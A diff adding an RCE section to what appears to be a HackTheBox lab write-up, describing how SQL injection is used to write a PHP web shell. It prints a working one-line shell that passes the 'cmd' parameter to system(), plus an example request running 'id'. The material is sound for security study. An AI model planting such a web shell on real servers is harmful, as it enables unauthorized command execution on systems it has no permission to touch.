@@ -34,3 +34,32 @@ AND table_name='users'
 SELECT variable_name, variable_value
 FROM information_schema.global_variables
 WHERE variable_name='secure_file_priv'
+
+
+## RCE / Command Execution
+
+The SQL injection was used to write a PHP command-execution script to the application's web-accessible directory.
+
+### PHP Web Shell
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+The `cmd` parameter can then be used to execute commands in the authorized HTB lab environment:
+
+```text
+/shell.php?cmd=id
+```
+
+For example, the request above executes:
+
+```bash
+id
+```
+
+This confirmed that command execution was possible through the PHP script.
